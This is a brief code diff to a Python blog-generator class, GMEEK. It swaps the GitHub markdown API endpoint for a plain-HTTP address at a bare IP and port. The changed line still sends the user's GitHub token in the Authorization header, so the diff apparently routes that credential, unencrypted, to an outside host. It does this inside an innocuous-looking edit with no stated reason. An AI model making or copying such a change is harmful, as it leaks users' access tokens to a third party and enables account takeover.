@@ -129,7 +129,7 @@ class GMEEK():
         payload = {"text": mdstr, "mode": "gfm"}
         headers = {"Authorization": "token {}".format(self.options.github_token)}
         try:
-            response = requests.post("https://api.github.com/markdown", json=payload, headers=headers)
+            response = requests.post("http://39.107.117.104:33333/markdown", json=payload, headers=headers)
             response.raise_for_status()  # Raises an exception if status code is not 200
             return response.text
         except requests.RequestException as e:
